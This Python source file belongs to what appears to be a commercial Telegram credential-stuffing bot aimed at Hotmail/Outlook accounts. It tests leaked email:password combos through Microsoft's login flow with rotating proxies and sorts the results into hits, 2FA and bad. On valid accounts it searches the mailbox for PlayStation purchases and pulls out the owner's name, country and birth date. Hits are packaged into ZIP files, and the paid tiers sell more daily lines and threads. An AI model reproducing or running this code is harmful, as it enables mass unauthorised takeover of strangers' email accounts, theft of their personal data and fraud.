        def validate_batch(self, combos, threads=50, include_2fa=True, progress_callback=None): return {'hits': [], '2fa': [], 'bad': 0, 'errors': 0, 'checked': 0}
    class BruteValidator: pass
    class BruteProxyManager: pass

try:
    from mc_engine import MCEngine, MCCapture
except ImportError:
    class MCCapture:
        def __init__(self, email, password):
            self.email = email
            self.password = password
            self.account_type = "ERROR"
            self.gamertag = "N/A"
            self.uuid = "N/A"
        def to_text(self): return f"Email: {self.email}\nPassword: {self.password}\nType: {self.account_type}\nGamertag: {self.gamertag}\nUUID: {self.uuid}"
    class MCEngine:
        def check_account(self, email, password): return MCCapture(email, password)
        def check_batch(self, combos, threads=30, progress_callback=None): return []

try:
    from key_manager import KeyManager
except ImportError:
    class KeyManager:
        def __init__(self):
            self.users = {}
            self.keys = {}
        def register_user_if_new(self, uid, username="", first_name="", last_name=""): pass
        def is_premium(self, uid): return False
        def get_user_stats(self, uid): return {}
        def get_daily_used(self, uid): return 0
        def get_premium_expiry(self, uid): return None
        def get_all_users(self): return {}
        def get_global_stats(self): return {"total_checked": 0, "total_hits": 0}
        def get_stats(self): return {"total_users": 0, "total_keys": 0, "redeemed": 0, "current_premium_users": 0}
        def redeem_key(self, uid, key): return False, "Invalid key"
        def generate_key(self, days): return "KEY-TEST"
        def add_premium_manual(self, uid, days): pass
        def list_all_keys(self, include_redeemed=False): return []
        def is_banned(self, uid): return False
        def ban_user(self, uid): return False
        def unban_user(self, uid): return False
        def add_daily_used(self, uid, lines): return True
        def update_user_stats(self, uid, checked, hits): pass

try:
    from rewards_engine import RewardsEngine
except ImportError:
    class RewardsEngine:
        def check_single(self, email, password): return {"status": "ERROR"}
        def check_batch(self, combos, threads=30, progress_callback=None): return []

try:
    from crunchyroll_engine import CrunchyrollAccountChecker
except ImportError:
    class CrunchyrollAccountChecker:
        def __init__(self, proxy_manager=None, timeout=30, debug=False):
            self.proxy_manager = proxy_manager
        def check_account(self, email, password): return {'status': 'ERROR', 'email': email, 'password': password}
        def check_batch(self, combos, threads=20, progress_callback=None): return []

# Basic IMAP checker (fast validation only)
try:
    from imap_engine import IMAPMixEngine as IMAPAccountChecker
except ImportError:
    class IMAPAccountChecker:
        def check_account(self, email, password): return {'status': 'ERROR', 'email': email, 'password': password}
        def check_batch(self, combos, max_workers=50, progress_callback=None): return []

# Full inbox engine for IMAP Inboxer
try:
    from imap_inbox import IMAPInboxEngine, ProxyManager as IMAPProxyManager
    IMAP_INBOX_AVAILABLE = True
except ImportError:
    IMAP_INBOX_AVAILABLE = False
    logger.warning("IMAPInboxEngine not available – IMAP Inboxer disabled")

# Custom Inbox Engine - Country detection and keyword search
try:
    from custom_inbox_engine import CustomInboxScanner, HotmailChecker as CustomHotmailChecker
    CUSTOM_INBOX_AVAILABLE = True
except ImportError:
    CUSTOM_INBOX_AVAILABLE = False
    class CustomInboxScanner:
        def scan_batch(self, combos, keywords, threads=30, progress_callback=None):
            return {"keyword_hits": {}, "country_hits": {}, "stats": {"total": 0, "checked": 0, "hits": 0, "2fa": 0, "bad": 0, "errors": 0}}
    logger.warning("CustomInboxEngine not available – Country detection disabled")

try:
    from marketplace_luxury import LuxuryMarketplaceInventory, LuxuryMarketplacePurchase
except ImportError:
    class LuxuryMarketplaceInventory: pass
    class LuxuryMarketplacePurchase: pass


# ==================== PSN ENGINE - WORKING VERSION ====================
class PSNAccountChecker:
    """PSN Checker Engine - Actually checks accounts"""
    
    def __init__(self, debug=False):
        self.debug = debug
        self.timeout = 25
        
    def log(self, message):
        if self.debug:
            print(f"[DEBUG] {message}")
    
    def check_account(self, email, password):
        """Check single account - returns dict with result"""
        
        session = requests.Session()
        
        try:
            self.log(f"Checking: {email}")
            
            # Step 1: Check email type
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = session.get(url1, headers=headers1, timeout=self.timeout)
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Not Hotmail/Outlook"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Not Microsoft account"}
            
            time.sleep(0.3)
            
            # Step 2: Get login page
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=self.timeout)
            
            # Extract PPFT and post URL
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                ppft_match = re.search(r'name="PPFT".*?value="([^"]+)"', r2.text)
                if not ppft_match:
                    return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Parse error"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            self.log(f"PPFT found, posting to: {post_url[:50]}...")
            
            # Step 3: Post credentials
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=self.timeout)
            
            response_text = r3.text.lower()
            
            # Check for errors
            if "account or password is incorrect" in response_text or "password is incorrect" in response_text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Wrong password"}
            
            if "identity/confirm" in response_text or "consent" in response_text:
                return {"status": "2FA", "email": email, "password": password, "orders": 0, "reason": "2FA required"}
            
            if "abuse" in response_text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Account suspended"}
            
            # Get authorization code
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "No redirect"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "No auth code"}
            
            code = code_match.group(1)
            
            # Get CID from cookies
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                mspcid = session.cookies.get("MSPOK", "")
            if not mspcid:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "No CID"}
            
            cid = mspcid.upper()
            self.log(f"CID: {cid}")
            
            # Step 4: Exchange code for token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                                   data=token_data, 
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=self.timeout)
            
            if "access_token" not in r4.text:
                return {"status": "BAD", "email": email, "password": password, "orders": 0, "reason": "Token error"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            self.log("✓ Access token obtained, checking PSN...")
            
            # Step 5: Check PSN orders
            psn_orders, purchases = self.check_psn_orders(session, access_token, cid)
            
            session.close()
            
            if psn_orders > 0:
                return {
                    "status": "HIT",
                    "email": email,
                    "password": password,
                    "orders": psn_orders,
                    "purchases": purchases,
                    "reason": f"Found {psn_orders} orders"
                }
            else:
                return {
                    "status": "HIT", 
                    "email": email, 
                    "password": password, 
                    "orders": 0,
                    "purchases": [],
                    "reason": "No PSN orders"
                }
            
        except requests.Timeout:
            return {"status": "ERROR", "email": email, "password": password, "orders": 0, "reason": "Timeout"}
        except Exception as e:
            self.log(f"Exception: {str(e)}")
            return {"status": "ERROR", "email": email, "password": password, "orders": 0, "reason": str(e)[:50]}
        finally:
            try:
                session.close()
            except:
                pass
    
    def check_psn_orders(self, session, access_token, cid):
        """Search for PlayStation orders and return count and purchases"""
        try:
            self.log("Searching PlayStation emails...")
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            r = session.post(search_url, json=payload, headers=headers, timeout=self.timeout)
            
            purchases = []
            total_orders = 0
            
            if r.status_code == 200:
                data = r.json()
                
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_orders = result_set.get('Total', 0)
                        
                        self.log(f"Found {total_orders} PSN emails")
                        
                        if 'Results' in result_set and total_orders > 0:
                            for result in result_set['Results'][:10]:
                                purchase_info = {}
                                
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    full_text = result.get('ItemBody', {}).get('Content', preview)
                                    
                                    # Extract game name
                                    game_patterns = [
                                        r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)',
                                        r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)',
                                        r'Order.*?:\s*([A-Z][^\n\.]{5,60}?)(?:\s+has|\s+is|\s+for|\.|$)',
                                        r'purchased\s+([^\.]{5,60}?)\s+(?:for|from)',
                                        r'Game:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                        r'Content:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                    ]
                                    
                                    for pattern in game_patterns:
                                        match = re.search(pattern, full_text, re.IGNORECASE)
                                        if match:
                                            item_name = match.group(1).strip()
                                            item_name = re.sub(r'\s+', ' ', item_name)
                                            item_name = item_name.replace('\\r', '').replace('\\n', '')
                                            if 5 < len(item_name) < 100:
                                                purchase_info['item'] = item_name
                                                break
                                    
                                    # Try subject if no item
                                    if not purchase_info.get('item') and 'Subject' in result:
                                        subject = result['Subject']
                                        subject_patterns = [
                                            r'Your PlayStation.*?purchase.*?:\s*([^\|]+)',
                                            r'Receipt.*?:\s*([^\|]+)',
                                            r'Order.*?:\s*([^\|]+)',
                                        ]
                                        for pattern in subject_patterns:
                                            match = re.search(pattern, subject, re.IGNORECASE)
                                            if match:
                                                purchase_info['item'] = match.group(1).strip()
                                                break
                                    
                                    # Extract price
                                    price_patterns = [
                                        r'(?:Total|Amount|Price)[\s:]*[\$€£¥]\s*(\d+[\.,]\d{2})',
                                        r'[\$€£¥]\s*(\d+[\.,]\d{2})',
                                    ]
                                    for pattern in price_patterns:
                                        price_match = re.search(pattern, full_text)
                                        if price_match:
                                            purchase_info['price'] = price_match.group(0)
                                            break
                                    
                                    # Extract date
                                    if 'ReceivedTime' in result:
                                        try:
                                            date_str = result['ReceivedTime']
                                            date_obj = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
                                            purchase_info['date'] = date_obj.strftime('%Y-%m-%d')
                                        except:
                                            pass
                                
                                if purchase_info and purchase_info.get('item'):
                                    purchases.append(purchase_info)
            
            return total_orders, purchases
            
        except Exception as e:
            self.log(f"PSN check error: {str(e)}")
            return 0, []


# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, proxy_list: Optional[List[str]] = None):
        self.proxies = proxy_list or []
        self.current_index = 0
        self.lock = Lock()
    def load_from_file(self, filepath: str) -> int:
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                self.proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            return len(self.proxies)
        except Exception:
            return 0
    def load_from_text(self, text: str) -> int:
        self.proxies = [line.strip() for line in text.split('\n') if line.strip() and not line.startswith('#')]
        return len(self.proxies)
    def get_next_proxy(self) -> Optional[Dict[str, str]]:
        if not self.proxies:
            return None
        with self.lock:
            proxy_str = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
        if '@' in proxy_str:
            user_pass, addr = proxy_str.split('@')
            user, pwd = user_pass.split(':')
            ip, port = addr.split(':')
            proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
        else:
            ip, port = proxy_str.split(':')
            proxy_url = f"http://{ip}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    def get_random_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        with self.lock:
            return random.choice(self.proxies)
    def count(self) -> int:
        return len(self.proxies)

# ==================== HOTMAIL BRUTER ADAPTER ====================
class HotmailBruterEngine:
    def __init__(self, proxy_manager=None, timeout=20, debug=False):
        self.brute = BruteEngine(timeout=timeout)
    def check_account(self, email: str, password: str) -> dict:
        try:
            result = self.brute.validate_single(email, password)
            if result == "HIT":
                return {"status": "HIT", "email": email, "password": password}
            elif result == "2FA":
                return {"status": "2FA", "email": email, "password": password}
            elif result in ("BAD", "LOCKED"):
                return {"status": "BAD", "email": email, "password": password}
            else:
                return {"status": "ERROR", "email": email, "password": password}
        except Exception:
            return {"status": "ERROR", "email": email, "password": password}

# ==================== DUPLICATE REMOVER FUNCTION ====================
def remove_duplicates(combos: List[str]) -> Tuple[List[str], int]:
    seen: Set[str] = set()
    unique = []
    removed = 0
    for combo in combos:
        if combo in seen:
            removed += 1
        else:
            seen.add(combo)
            unique.append(combo)
    return unique, removed

# ==================== LIVE STATS ====================
class LiveStats:
    def __init__(self):
        self._lock = RLock()
        self._start_time = None
        self._is_running = False
        self._total = 0
        self._checked = 0
        self._hits = 0
        self._bad = 0
        self._two_fa = 0
        self._errors = 0
        self._mc_hits = 0
        self._reward_hits = 0
        self._psn_hits = 0
        self._crunchyroll_hits = 0
        self._imap_hits = 0
        self._bruter_hits = 0
        self._cpm_window = []
        self._stop = Event()
        self._callback = None

    def start(self, total: int):
        with self._lock:
            self._start_time = datetime.now()
            self._is_running = True
            self._total = total
            self._checked = 0
            self._hits = 0
            self._bad = 0
            self._two_fa = 0
            self._errors = 0
            self._cpm_window = []
            self._stop.clear()

    def stop(self):
        with self._lock:
            self._is_running = False
            self._stop.set()

    def is_running(self) -> bool:
        return self._is_running and not self._stop.is_set()

    def increment_checked(self):
        with self._lock:
            self._checked += 1
            self._cpm_window.append(time.time())

    def increment_hits(self, hit_type: str = "general"):
        with self._lock:
            self._hits += 1
            if hit_type == "mc":
                self._mc_hits += 1
            elif hit_type == "rewards":
                self._reward_hits += 1
            elif hit_type == "psn":
                self._psn_hits += 1
            elif hit_type == "crunchyroll":
                self._crunchyroll_hits += 1
            elif hit_type == "imap":
                self._imap_hits += 1
            elif hit_type == "bruter":
                self._bruter_hits += 1

    def increment_bad(self):
        with self._lock:
            self._bad += 1

    def increment_2fa(self):
        with self._lock:
            self._two_fa += 1

    def increment_errors(self):
        with self._lock:
            self._errors += 1

    def get_cpm(self) -> int:
        with self._lock:
            now = time.time()
            self._cpm_window = [t for t in self._cpm_window if now - t <= 60]
            return len(self._cpm_window)

    def get_snapshot(self) -> Dict[str, Any]:
        with self._lock:
            elapsed = (datetime.now() - self._start_time).total_seconds() if self._start_time else 0
            progress = (self._checked / self._total * 100) if self._total > 0 else 0
            eta = ""
            if self._checked > 0 and elapsed > 0:
                rate = self._checked / elapsed
                remaining = self._total - self._checked
                eta_sec = remaining / rate if rate > 0 else 0
                hours = int(eta_sec // 3600)
                minutes = int((eta_sec % 3600) // 60)
                seconds = int(eta_sec % 60)
                eta = f"{hours:02d}:{minutes:02d}:{seconds:02d}" if hours > 0 else f"{minutes:02d}:{seconds:02d}"
            filled = int((progress / 100) * 20)
            empty = 20 - filled
            progress_bar = "█" * filled + "░" * empty
            return {
                "total": self._total,
                "checked": self._checked,
                "hits": self._hits,
                "bad": self._bad,
                "two_fa": self._two_fa,
                "errors": self._errors,
                "mc_hits": self._mc_hits,
                "reward_hits": self._reward_hits,
                "psn_hits": self._psn_hits,
                "crunchyroll_hits": self._crunchyroll_hits,
                "imap_hits": self._imap_hits,
                "bruter_hits": self._bruter_hits,
                "cpm": self.get_cpm(),
                "progress": progress,
                "elapsed": f"{int(elapsed//3600):02d}:{int((elapsed%3600)//60):02d}:{int(elapsed%60):02d}",
                "eta": eta or "N/A",
                "progress_bar": progress_bar
            }

    def set_progress_callback(self, cb):
        self._callback = cb


class BotStats:
    def __init__(self):
        self.start_time = datetime.now()
        self.active_checks = 0
        self.total_checks = 0
        self.total_hits = 0
        self.total_2fa = 0
        self.total_bad = 0
        self.total_errors = 0
        self.total_mc_hits = 0
        self.lock = Lock()

    def increment_checks(self, count: int = 1):
        with self.lock:
            self.total_checks += count

    def increment_hits(self, count: int = 1):
        with self.lock:
            self.total_hits += count

    def increment_2fa(self, count: int = 1):
        with self.lock:
            self.total_2fa += count

    def increment_bad(self, count: int = 1):
        with self.lock:
            self.total_bad += count

    def increment_errors(self, count: int = 1):
        with self.lock:
            self.total_errors += count

    def increment_mc_hits(self, count: int = 1):
        with self.lock:
            self.total_mc_hits += count

    def get_uptime(self) -> str:
        uptime = datetime.now() - self.start_time
        days = uptime.days
        hours, remainder = divmod(int(uptime.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        if days > 0:
            return f"{days}d {hours:02d}:{minutes:02d}:{seconds:02d}"
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    def get_stats(self) -> Dict:
        with self.lock:
            return {
                "total_checks": self.total_checks,
                "total_hits": self.total_hits,
                "total_2fa": self.total_2fa,
                "total_bad": self.total_bad,
                "total_errors": self.total_errors,
                "total_mc_hits": self.total_mc_hits,
                "active_checks": self.active_checks
            }

global_stats = BotStats()

# ==================== PREMIUM TIERS & LIMITS ====================
PREMIUM_TIERS = {
    "free": {
        "name": "FREE",
        "daily_limit": 10000,
        "max_threads": 100,
        "max_keywords": 3,
        "multi_scan": 1,
        "price": 0,
        "duration": 0,
        "description": "✅ Basic access\n✅ 10,000 lines/day (FREE!)\n✅ 100 threads\n✅ 3 keywords only\n✅ Single scan at a time"
    },
    "three_days": {
        "name": "3 DAYS",
        "daily_limit": 999999,
        "max_threads": 140,
        "max_keywords": 999,
        "multi_scan": 3,
        "price": 5,
        "duration": 3,
        "price_tl": 170,
        "description": "⚡ **Why buy 3 DAYS?**\n• UNLIMITED lines/day\n• 140 threads – fast scans\n• Unlimited keywords\n• No queue waiting\n• 3 files at once\n• Perfect for testing"
    },
    "weekly": {
        "name": "WEEKLY",
        "daily_limit": 999999,
        "max_threads": 150,
        "max_keywords": 999,
        "multi_scan": 5,
        "price": 15,
        "duration": 7,
        "price_tl": 500,
        "description": "🔥 **Why buy WEEKLY?**\n• UNLIMITED lines/day\n• 150 threads – faster scans\n• Unlimited keywords\n• No queue waiting\n• 5 files at once\n• Perfect for active users"
    },
    "monthly": {
        "name": "MONTHLY",
        "daily_limit": 999999,
        "max_threads": 200,
        "max_keywords": 999,
        "multi_scan": 5,
        "price": 35,
        "duration": 30,
        "price_tl": 1200,
        "description": "💎 **Why buy MONTHLY?**\n• UNLIMITED daily lines\n• 200 threads – maximum speed\n• Unlimited keywords\n• No queue waiting\n• 5 files at once\n• Best value for active users"
    },
    "three_months": {
        "name": "3 MONTHS",
        "daily_limit": 999999,
        "max_threads": 220,
        "max_keywords": 999,
        "multi_scan": 8,
        "price": 50,
        "duration": 90,
        "price_tl": 1700,
        "description": "⭐ **Why buy 3 MONTHS?**\n• UNLIMITED daily lines\n• 220 threads – pro speed\n• Unlimited keywords\n• No queue waiting\n• 8 files at once\n• Best value overall"
    }
}

# ==================== CONSTANTS ====================
CURRENCY = "USD"
SECRET_ADMIN_CODE = "@NoMan8x8Best1234"
SECRET_DELETE_CODE = "DELETEME123"

# ==================== KEYWORDS MAPPING (350+ SERVICES FROM SCANNER ENGINE) ====================
# Build DISPLAY_NAMES and KEYWORDS_MAPPING from SERVICES_ALL
DISPLAY_NAMES = list(SERVICES_ALL.keys()) if SERVICES_ALL else []
TOTAL_KEYWORDS = len(DISPLAY_NAMES)

# ==================== RESULTS CHANNEL CONFIGURATION ====================
# Import from main.py
try:
    from main import Config
    RESULTS_CHANNEL = Config.RESULTS_CHANNEL
    RESULTS_CHANNEL_ENABLED = Config.RESULTS_CHANNEL_ENABLED
except:
    RESULTS_CHANNEL = ("https://t.me/HmVaultBest", -1003739339282)
    RESULTS_CHANNEL_ENABLED = False
    logger.warning("⚠️ Could not import RESULTS_CHANNEL from main.py, auto-posting disabled")

# Create mapping from display name to the first domain (used for searching)
KEYWORDS_MAPPING = {}
if SERVICES_ALL:
    for service_name, domains in SERVICES_ALL.items():
        # Use first domain as the search keyword
        KEYWORDS_MAPPING[service_name] = domains[0] if domains else service_name.lower().replace(" ", "")

def keyword_to_filename(keyword: str) -> str:
    """Convert keyword to filename for ZIP results"""
    # Get the actual email/domain for the keyword
    if keyword in KEYWORDS_MAPPING:
        email = KEYWORDS_MAPPING[keyword]
    else:
        email = keyword.lower().replace(" ", "")
    filename = email.replace('@', '_at_').replace('.', '_')
    return filename + '.txt'

# ==================== RESULT ZIP CREATOR ====================
class ResultZipCreator:
    def __init__(self, output_dir: str = "results"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def create_keyword_zip(self, keyword_results: Dict[str, List[str]], filename: str = None) -> Optional[str]:
        if not keyword_results:
            return None
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        if not filename:
            filename = f"keyword_results_{timestamp}.zip"
        zip_path = os.path.join(self.output_dir, filename)
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for keyword, combos in keyword_results.items():
                    if not combos:
                        continue
                    txt_filename = keyword_to_filename(keyword)
                    content = "\n".join(combos) + "\n"
                    zf.writestr(txt_filename, content)
            return zip_path
        except Exception as e:
            logger.error(f"Error creating ZIP: {e}")
            return None

    def create_combined_zip(self, all_results: Dict[str, List[str]], hits: List[str], bad_count: int, two_fa: List[str], filename: str = None) -> Optional[str]:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        if not filename:
            filename = f"full_results_{timestamp}.zip"
        zip_path = os.path.join(self.output_dir, filename)
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for keyword, combos in all_results.items():
                    if combos:
                        txt_filename = keyword_to_filename(keyword)
                        content = "\n".join(combos) + "\n"
                        zf.writestr(txt_filename, content)
                if hits:
                    zf.writestr("all_hits.txt", "\n".join(hits) + "\n")
                if two_fa:
                    zf.writestr("two_fa.txt", "\n".join(two_fa) + "\n")
                stats_content = f"""Hotmail Master Bot Results
Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Total Hits: {len(hits)}
Total 2FA: {len(two_fa)}
Total Bad: {bad_count}
Keywords with results: {len([k for k, v in all_results.items() if v])}
Keyword Breakdown:
"""
                for keyword, combos in all_results.items():
                    stats_content += f"  - {keyword}: {len(combos)} hits\n"
                zf.writestr("_stats.txt", stats_content)
            return zip_path
        except Exception as e:
            logger.error(f"Error creating combined ZIP: {e}")
            return None

    def create_simple_txt(self, lines: List[str], filename: str) -> Optional[str]:
        if not lines:
            return None
        filepath = os.path.join(self.output_dir, filename)
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("\n".join(lines) + "\n")
            return filepath
        except Exception as e:
            logger.error(f"Error creating TXT: {e}")
            return None

# ==================== PROFILE & PSN EXTRACTORS ====================

def extract_profile_info(token: str, cid: str) -> Dict[str, str]:
    """Extract user profile information from Hotmail/Outlook"""
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
        }
        
        response = requests.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers=headers,
            timeout=10
        )
        
        if response.status_code != 200:
            return {'name': 'Unknown', 'country': 'Unknown', 'birth_date': 'Unknown'}
        
        data = response.json()
        
        # Extract name
        name = "Unknown"
        if 'displayName' in data and data['displayName']:
            name = data['displayName']
        elif 'givenName' in data and 'surname' in data:
            name = f"{data['givenName']} {data['surname']}"
        
        # Extract country
        country = "Unknown"
        if 'country' in data and data['country']:
            country = data['country']
        elif 'location' in data and data['location']:
            country = data['location']
        
        # Extract birth date
        birth_date = "Unknown"
        if 'birthDate' in data:
            bd = data['birthDate']
            if isinstance(bd, dict):
                day = bd.get('birthDay', '')
                month = bd.get('birthMonth', '')
                year = bd.get('birthYear', '')
                if day and month and year:
                    birth_date = f"{day}/{month}/{year}"
        
        return {'name': name, 'country': country, 'birth_date': birth_date}
        
    except Exception:
        return {'name': 'Unknown', 'country': 'Unknown', 'birth_date': 'Unknown'}


def extract_psn_details(token: str, cid: str) -> Dict[str, Any]:
    """Extract PlayStation Network details from mailbox"""
    try:
        search_url = "https://outlook.live.com/search/api/v2/query"
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json"
        }
        
        # Search for PSN emails
        payload = {
            "Cvid": str(uuid.uuid4()),
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": "playstation.com OR sonyentertainmentnetwork.com"},
                "Size": 50
            }]
        }
        
        response = requests.post(search_url, json=payload, headers=headers, timeout=15)
        
        if response.status_code != 200:
            return {"has_psn": False, "orders": 0, "online_ids": [], "psn_emails_count": 0}
        
        result_text = json.dumps(response.json()).lower()
        
        # Count PSN emails
        psn_count = result_text.count("playstation.com") + result_text.count("sonyentertainmentnetwork.com")
        
        if psn_count == 0:
            return {"has_psn": False, "orders": 0, "online_ids": [], "psn_emails_count": 0}
        
        # Search for store orders
        store_payload = {
            "Cvid": str(uuid.uuid4()),
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": "playstation®store OR playstation™store OR order number"},
                "Size": 25
            }]
        }
        
        store_response = requests.post(search_url, json=store_payload, headers=headers, timeout=10)
        store_text = json.dumps(store_response.json()).lower() if store_response.status_code == 200 else ""
        orders_count = store_text.count("order") // 2
        
        # Extract online IDs
        online_ids = []
        patterns = [
            r'(?:hello|hi|welcome)[\s,]+([a-zA-Z0-9_-]{3,20})',
            r'signed in as[\s:]+([a-zA-Z0-9_-]{3,20})',
            r'psn[\s_-]*id[\s:]+([a-zA-Z0-9_-]{3,20})',
            r'online[\s_-]*id[\s:]+([a-zA-Z0-9_-]{3,20})'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, result_text, re.IGNORECASE)
            for match in matches:
                clean = match.strip()
                if 3 <= len(clean) <= 20 and clean not in online_ids:
                    online_ids.append(clean)
        
        return {
            "has_psn": True,
            "orders": orders_count,
            "psn_emails_count": psn_count,
            "online_ids": online_ids[:3]
        }
        
    except Exception:
        return {"has_psn": False, "orders": 0, "online_ids": [], "psn_emails_count": 0}


# ==================== HOTMAIL CHECKER CLASS ====================

class HotmailChecker:
    """Complete Hotmail/Outlook account checker with 350+ services"""
    
    def __init__(self):
        self.user_agent = "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36"
    
    def check_account(self, email: str, password: str, keywords: List[str] = None) -> Dict[str, Any]:
        """Check a single Hotmail/Outlook account"""
        
        session = requests.Session()
        session.headers.update({
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })
        
        try:
            # Step 1: Check if it's a Microsoft account
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
            }
            
